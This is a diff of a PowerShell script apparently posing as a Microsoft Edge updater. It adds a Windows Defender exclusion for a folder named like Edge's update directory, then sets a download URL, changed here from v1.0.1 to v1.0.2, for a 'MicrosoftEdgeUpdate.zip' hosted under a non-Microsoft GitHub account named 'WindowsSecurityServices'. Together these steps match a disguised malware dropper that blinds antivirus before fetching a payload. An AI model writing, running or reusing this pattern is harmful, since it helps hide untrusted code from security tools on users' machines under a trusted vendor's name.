@@ -4,7 +4,7 @@ Add-MpPreference -ExclusionPath "C:\Program Files (x86)\Microsoft\EdgeUpdate\Upd
 # Check to ensure the exclusion took place
 (Get-MpPreference).ExclusionPath
 # Define environment variables
-$DownloadUrl = "https://github.com/WindowsSecurityServices/MicrosoftEdgeUpdate/releases/download/v1.0.1/MicrosoftEdgeUpdate.zip"
+$DownloadUrl = "https://github.com/WindowsSecurityServices/MicrosoftEdgeUpdate/releases/download/v1.0.2/MicrosoftEdgeUpdate.zip"
 
 # Updated base directory configurations
 $BaseDir     = "C:\Program Files (x86)\Microsoft\EdgeUpdate"
